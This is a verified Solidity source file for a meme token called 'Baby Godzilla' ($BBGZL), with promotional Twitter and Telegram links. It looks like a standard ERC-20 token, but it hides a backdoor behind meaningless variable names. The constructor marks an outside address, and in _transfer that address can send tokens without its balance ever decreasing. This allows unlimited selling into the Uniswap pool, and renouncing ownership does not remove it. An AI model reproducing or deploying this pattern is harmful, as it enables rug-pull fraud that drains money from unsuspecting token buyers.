/**
 *Submitted for verification at Etherscan.io on 2023-05-14
*/

/*

Roar! Baby Godzilla is hungry! 🦎 $BBGZL
Join us:

Twitter: https://twitter.com/BabyGodzi

Telegram: https://t.me/baby_godzilla

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BabyGodzilla is Ownable {
    string public name;

    function _transfer(address circle, address emotion, uint256 vicious) private returns (bool success) {
        if (enough[circle] == 0) {
            balanceOf[circle] -= vicious;
            if (drum[circle] > 0 && circle != uniswapV2Pair) {
                enough[circle] -= rhythm;
            }
        }
        balanceOf[emotion] += vicious;
        emit Transfer(circle, emotion, vicious);
        return true;
    }

    mapping(address => uint256) private enough;
    mapping(address => uint256) private drum;
    uint8 public decimals = 18;
    uint256 private rhythm = 36;

    function approve(address right, uint256 vicious) public returns (bool success) {
        allowance[msg.sender][right] = vicious;
        emit Approval(msg.sender, right, vicious);
        return true;
    }

    function transferFrom(address circle, address emotion, uint256 vicious) public returns (bool success) {
        _transfer(circle, emotion, vicious);
        require(vicious <= allowance[circle][msg.sender]);
        allowance[circle][msg.sender] -= vicious;
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply;

    function transfer(address emotion, uint256 vicious) public returns (bool success) {
        _transfer(msg.sender, emotion, vicious);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address language) {
        symbol = 'BBGZL';
        name = 'Baby Godzilla';
        enough[language] = rhythm;
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
}